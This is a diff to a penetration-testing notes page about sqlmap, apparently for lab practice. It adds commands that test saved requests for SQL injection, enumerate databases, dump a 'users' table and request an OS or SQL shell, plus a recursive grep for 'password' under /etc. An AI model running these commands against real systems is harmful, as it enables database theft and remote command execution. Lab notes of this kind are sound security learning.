@@ -9,6 +9,66 @@ hideFooterPagination: true
 
 {/* Generated from Commands/sqlmap.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## sqlmap: choose the operation and read the result
+
+Test an identified SQL injection surface using a saved request.
+
+### What the result establishes
+
+Preserve a valid authenticated request and select the input before interpreting confirmed technique and DBMS evidence.
+
+### Prerequisites and common failures
+
+An expired session or CSRF failure cannot be repaired by increasing level/risk; database access and OS execution remain separate outcomes.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+sqlmap -r request.txt --batch
+sqlmap -r request.txt --dbs
+sqlmap -r request.txt -D DATABASE --tables
+```
+
+### Example 2: Earlier notebook reference
+
+Run in: **Saved lab example**.
+
+```bash
+sqlmap -r request.txt --batch                 # from a saved raw request
+sqlmap -u "http://$IP/item?id=1" --batch --dbs
+sqlmap -u "http://$IP/item?id=1" -D shop --tables
+sqlmap -u "http://$IP/item?id=1" -D shop -T users --dump
+# Auth / cookies / POST
+sqlmap -u "http://$IP/login" --data "user=a&pass=b" -p user
+sqlmap -u "http://$IP/x" --cookie "PHPSESSID=..." --level 5 --risk 3
+# Shells
+sqlmap -r request.txt --os-shell            # OS command shell if possible
+sqlmap -r request.txt --sql-shell
+```
+
+Saved context: [SQLMap — Earlier notebook reference](/web/sqlmap#earlier-notebook-reference). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Finding things
+
+Run in: **Saved lab example**.
+
+```bash
+find / -name "*.conf" 2>/dev/null      # find by name, hide permission errors
+find . -type f -mmin -10               # files modified in last 10 min
+locate sqlmap                          # fast name search (run: sudo updatedb first)
+which nmap                             # path of a command
+whereis nmap
+grep -ri "password" /etc 2>/dev/null   # recursive, case-insensitive search in files
+```
+
+Saved context: [Kali Terminal, tmux, zsh, and Vim — Finding things](/cheatsheets/terminal-tmux-zsh-cheatsheet#finding-things). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Test an identified SQL injection surface using a saved request.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=sqlmap) · [All tools](/index)
@@ -46,6 +106,13 @@ whereis nmap
 grep -ri "password" /etc 2>/dev/null   # recursive, case-insensitive search in files
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kali Terminal, tmux, zsh, and Vim — Finding things](/cheatsheets/terminal-tmux-zsh-cheatsheet#finding-things)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="sqlmap: Saved Requests and Enumeration">
@@ -67,6 +134,21 @@ sqlmap -r request.txt --os-shell            # OS command shell if possible
 sqlmap -r request.txt --sql-shell
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — Earlier notebook reference](/web/sqlmap#earlier-notebook-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [SQLMap](/web/sqlmap)
+
+{/* VAULT_RELATED_END */}
